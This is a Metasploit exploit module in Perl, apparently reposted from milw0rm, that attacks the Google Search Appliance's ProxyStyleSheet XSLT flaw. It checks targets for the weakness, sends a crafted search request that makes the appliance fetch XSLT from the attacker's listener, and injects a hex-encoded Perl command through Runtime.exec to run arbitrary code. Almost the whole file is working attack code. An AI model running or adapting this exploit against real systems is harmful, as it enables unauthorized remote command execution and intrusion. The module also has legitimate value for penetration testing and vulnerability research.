##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::google_proxystylesheet_exec;

use strict;
use base "Msf::Exploit";
use Pex::Text;
use IO::Socket;
use IO::Select;
my $advanced = { };

my $info =
{
	'Name'           => 'Google Appliance ProxyStyleSheet Command Execution',
	'Version'        => '$Revision: 1.1 $',
	'Authors'        => [ 'H D Moore <hdm [at] metasploit.com>' ],
	
	'Description'    => 
		Pex::Text::Freeform(qq{
			This module exploits a feature in the Saxon XSLT parser used by
		the Google Search Appliance. This feature allows for arbitrary
		java methods to be called. Google released a patch and advisory to 
		their client base in August of 2005 (GA-2005-08-m). The target appliance
		must be able to connect back to your machine for this exploit to work.
		}),
		
	'Arch'           => [ ],
	'OS'             => [ ],
	'Priv'           => 0,
	'UserOpts'       => 
		{
			'RHOST'    => [ 1, 'HOST', 'The address of the Google appliance'],
			'RPORT'    => [ 1, 'PORT', 'The port used by the search interface', 80],
			'HTTPPORT' => [ 1, 'PORT', 'The local HTTP listener port', 8080      ],
			'HTTPHOST' => [ 0, 'HOST', 'The local HTTP listener host', "0.0.0.0" ],
			'HTTPADDR' => [ 0, 'HOST', 'The address that can be used to connect back to this system'],
		},
	'Payload'        => 
		{
			'Space'    => 1024,
			'Keys'     => [ 'cmd' ],
		},
	'Refs'           => 
		[
			['OSVDB', 20981],
		],
	'DefaultTarget'  => 0,
	'Targets'        =>
		[
			[ 'Google Search Appliance']
		],
	'Keys'           => [ 'google' ],

	'DisclosureDate' => 'Aug 16 2005',
};

sub new
{
	my $class = shift;
	my $self;
	
	$self = $class->SUPER::new(
			{ 
				'Info'     => $info,
				'Advanced' => $advanced,
			},
			@_);

	return $self;
}

sub Check {
	my $self = shift;
	my $s = $self->ConnectSearch;
	
	if (! $s) {
		return $self->CheckCode('Connect');
	}
	
	my $url =
		"/search?client=". Pex::Text::AlphaNumText(int(rand(15))+1). "&".
		"site=".Pex::Text::AlphaNumText(int(rand(15))+1)."&".
		"output=xml_no_dtd&".
		"q=".Pex::Text::AlphaNumText(int(rand(15))+1)."&".
		"proxystylesheet=http://".Pex::Text::AlphaNumText(int(rand(32))+1)."/";
	
	$s->Send("GET $url HTTP/1.0\r\n\r\n");
	my $page = $s->Recv(-1, 5);
	$s->Close;

	if ($page =~ /cannot be resolved to an ip address/) {
		$self->PrintLine("[*] This system appears to be vulnerable >:-)");
		return $self->CheckCode('Confirmed');
	}
	
	if ($page =~ /ERROR: Unable to fetch the stylesheet/) {
		$self->PrintLine("[*] This system appears to be patched");
	}
	
	$self->PrintLine("[*] This system does not appear to be vulnerable");
	return $self->CheckCode('Safe');	
}


sub Exploit
{
	my $self = shift;
	my ($s, $page);
	
	# Request the index page to obtain a redirect response
	$s = $self->ConnectSearch || return;
	$s->Send("GET / HTTP/1.0\r\n\r\n");
	$page = $s->Recv(-1, 5);
	$s->Close;

	# Parse the redirect to get the client and site values
	my ($goog_site, $goog_clnt) = $page =~ m/^location.*site=([^\&]+)\&.*client=([^\&]+)\&/im;
	if (! $goog_site || ! $goog_clnt) {
		$self->PrintLine("[*] Invalid response to our request, is this a Google appliance?");
		#$self->PrintLine($page);
		#!!! return;
		$goog_site = 'test';
		$goog_clnt = 'test';
	}

	# Create the listening local socket that will act as our HTTP server
	my $lis = IO::Socket::INET->new(
			LocalHost => $self->GetVar('HTTPHOST'),
			LocalPort => $self->GetVar('HTTPPORT'),
			ReuseAddr => 1,
			Listen    => 1,
			Proto     => 'tcp');
	
	if (not defined($lis)) {
		$self->PrintLine("[-] Failed to create local HTTP listener on " . $self->GetVar('HTTPPORT'));
		return;
	}
	my $sel = IO::Select->new($lis);
	
	# Send a search request with our own address in the proxystylesheet parameter
	my $query = Pex::Text::AlphaNumText(int(rand(32))+1);
	
	my $proxy =
		"http://".
		($self->GetVar('HTTPADDR') || Pex::Utils::SourceIP($self->GetVar('RHOST'))).
		":".$self->GetVar('HTTPPORT')."/".Pex::Text::AlphaNumText(int(rand(15))+1).".xsl";
	
	my $url = 
		"/search?client=". $goog_clnt ."&site=". $goog_site .
		"&output=xml_no_dtd&proxystylesheet=". $proxy .
		"&q=". $query ."&proxyreload=1";

	$self->PrintLine("[*] Sending our malicious search request...");
	$s = $self->ConnectSearch || return;
	$s->Send("GET $url HTTP/1.0\r\n\r\n");
	$page = $s->Recv(-1, 3);
	$s->Close;

	$self->PrintLine("[*] Listening for connections to http://" . $self->GetVar('HTTPHOST') . ":" . $self->GetVar('HTTPPORT') . " ...");
	
	# Did we receive a connection?
	my @r = $sel->can_read(30);
	
	if (! @r) {
		$self->PrintLine("[*] No connection received from the search engine, possibly patched.");
		$lis->close;
		return;
	}

	my $c = $lis->accept();
	if (! $c) {
		$self->PrintLine("[*] No connection received from the search engine, possibly patched.");
		$lis->close;
		return;	
	}

	my $cli = Msf::Socket::Tcp->new_from_socket($c);
	$self->PrintLine("[*] Connection received from ".$cli->PeerAddr."...");	
	$self->ProcessHTTP($cli);
	return;
}

sub ConnectSearch {
	my $self = shift;
	my $s = Msf::Socket::Tcp->new(
		'PeerAddr' => $self->GetVar('RHOST'),
		'PeerPort' => $self->GetVar('RPORT'),
		'SSL'      => $self->GetVar('SSL')
	);
	
	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}
	return $s;
}

sub ProcessHTTP
{
	my $self = shift;
	my $cli  = shift;
	my $targetIdx = $self->GetVar('TARGET');
	my $target    = $self->Targets->[$targetIdx];
	my $ret       = $target->[1];
	my $shellcode = $self->GetVar('EncodedPayload')->Payload;
	my $content;
	my $rhost;
	my $rport;

	# Read the first line of the HTTP request
	my ($cmd, $url, $proto) = split(/ /, $cli->RecvLine(10));

	# The way we call Runtime.getRuntime().exec, Java will split
	# our string on whitespace. Since we are injecting via XSLT,
	# inserting quotes becomes a huge pain, so we do this...
	my $exec_str = 
		'/usr/bin/perl -e system(pack(qq{H*},qq{' .
		unpack("H*", $self->GetVar('EncodedPayload')->RawPayload).
		'}))';

	# Load the template from our data section, we have to manually
	# seek and reposition to allow the exploit to be used more
	# than once without a reload.
	seek(DATA, 0, 0);
	while(<DATA>) { last if /^__DATA__$/ }
	while(<DATA>) {	$content .= $_ }

	# Insert our command line
	$content =~ s/:x:MSF:x:/$exec_str/;
	
	# Send it to the requesting appliance
	$rport = $cli->PeerPort;
	$rhost = $cli->PeerAddr;
	$self->PrintLine("[*] HTTP Client connected from $rhost, sending XSLT...");
	
	my $res = "HTTP/1.1 200 OK\r\n" .
	          "Content-Type: text/html\r\n" .
	          "Content-Length: " . length($content) . "\r\n" .
	          "Connection: close\r\n" .
	          "\r\n" .
	          $content;

	$self->PrintLine("[*] Sending ".length($res)." bytes...");
	$cli->Send($res);
	$cli->Close;
}

1;

# milw0rm.com [2005-11-20]
